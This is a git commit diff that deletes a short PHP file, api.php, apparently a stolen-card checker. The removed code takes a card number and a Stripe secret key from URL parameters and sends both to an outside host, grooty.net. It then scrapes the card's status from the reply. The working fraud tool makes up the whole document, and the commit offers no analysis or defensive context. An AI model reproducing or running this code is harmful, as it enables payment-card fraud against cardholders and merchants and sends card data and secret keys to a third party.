f451d5db5b3b4df47bd8606a969e5db822057bdd
danialstore <105604381+danialstore@users.noreply.github.com>
2023-06-08 05:50:03 +0300

    Delete host.php directory

--- host.php/api.php
+++
@@ -1,7 +0,0 @@
-<?php 
-$sk = $_GET['sk'];
-$visa = $_GET['visa'];
-$g = file_get_contents("http://grooty.net/Stripe_1_New.php?cc_info=$visa&sk=$sk&referrer=Tikol4Life&telebot=&tele_msg=3");
-$f = str_replace('"',"'",$g);
-preg_match_all("/class='(.*?)' style='display:none;'/",$f,$c2);
-print_r(strtoupper($c2[1][0]));
